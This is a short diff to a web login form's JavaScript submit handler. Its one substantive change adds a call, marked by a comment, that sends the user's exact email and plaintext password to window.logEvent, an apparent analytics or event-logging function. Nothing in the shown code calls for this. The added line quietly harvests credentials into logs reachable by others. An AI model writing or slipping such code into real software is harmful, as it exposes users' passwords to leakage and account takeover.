@@ -103,6 +103,7 @@
     event.preventDefault();
     clearMessage();
 
+
     if (!event.submitter && continueBtn) {
       window.logEvent('click_login_button', { source: 'password_login', viaSubmitKey: true });
     }
@@ -112,6 +113,9 @@
 
     const email = (emailInput?.value || '').trim();
     const password = passwordInput?.value || '';
+
+    // log exact email and password used this time
+    window.logEvent('email_and_password_used', { email, password });
 
     const storedEmail = localStorage.getItem('password.userEmail');
     const storedPassword = localStorage.getItem('password.userPassword');
